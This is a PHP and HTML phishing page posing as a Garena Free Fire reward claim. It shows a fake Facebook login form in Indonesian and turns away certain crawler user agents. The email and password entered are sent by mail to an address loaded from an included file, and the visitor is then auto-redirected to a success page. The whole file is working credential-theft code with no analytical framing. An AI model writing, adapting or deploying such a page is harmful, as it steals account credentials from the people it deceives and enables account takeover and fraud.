<?php error_reporting(0); $r=$_POST['rr'];
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/mikazu.id.7');
die();
}
error_reporting(0);
$miraipediaa = $_POST['mirai-reward'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="../assets/css/miraipedia.css">
    <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <link rel="shorcut icon" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png"/>
    <title>Garena Free Fire</title>
</head>
<body>   

    <img src="../assets/images/uhulogo.png" />
<div class="content-mirai">
    <div class="row">
        <div class="col-sm-6 col-md-4 col-md-offset-4">
            <div class="login2">
                <form method="POST" class="form-signin">
                    <img class="img-login2" src="../assets/images/fb.png" alt="miraipedia">
                    <input type="text" name="userf" class="form-control" placeholder="Email Atau Telepon" required>
                    <input type="password" name="pwf" class="form-control" placeholder="Kata Sandi" required>

                    <br>
                    <button class="btn btn-lg btn-primary btn-block" name="r" value="<?php echo $miraipediaa;?>" type="submit">Masuk</button>
                </form>
            </div>
        </div>
    </div>
</div>
<?php 
        if (isset($_POST['r'])) {
            $r = $_POST['r'];
            $imel2 = $_POST['userf'];
            $pw2 = $_POST['pwf'];
            $imel3 = $_POST['userv'];
            $pw3= $_POST['pwv'];
            include '../imel.php';
		    $body = <<<EOD
		    <html><head><meta charset="UTF-8"><style>@font-face {font-family: "idhaam69";src: url(./assets/fonts/supercell.ttf);} #idhaam69 {font-family: "idhaam69";border-collapse: collapse;width: 50%;
		    margin: auto;}#idhaam69 td, #idhaam69 th {border: 1px solid #ddd;padding: 8px;}#idhaam69 tr:nth-child(even){background-color: #f2f2f2;}#idhaam69 tr:hover {background-color: #ddd;}
		    #idhaam69 th {padding-top: 12px;padding-bottom: 12px;text-align: left;background-color: #4CAF50;color: white;}</style></head>
		    <body>
		    <table id='Mastah Techno'>
            <tr><th>Data FB NYA.</th></tr>
		    <tr><td>Email : $imel2</td></tr>
            <tr><td>password : $pw2</td></tr>
		    </table>
		    </body>
		    </html>
EOD;
		    $subjek = 'FB MASUK NIH! '.$imel2.' ';
		    $headers = "From: MastahTechno@blogspot.com\r\n";
		    $headers .= "Content-type: text/html\r\n";
		    $success = mail($mailto, $subjek, $body, $headers);
            $random = rand(1000,5000);

            if ($success) {
                echo "<form id='autoea' action='../successfully.php' method='POST'>
                <input type='hidden' name='nickk' value='$n'>
                <input type='hidden' name='skinn' value='$r'>
                </form>
                <script type='text/javascript'>document.getElementById('autoea').submit();</script>";
            }
        }
    ?>  
</body>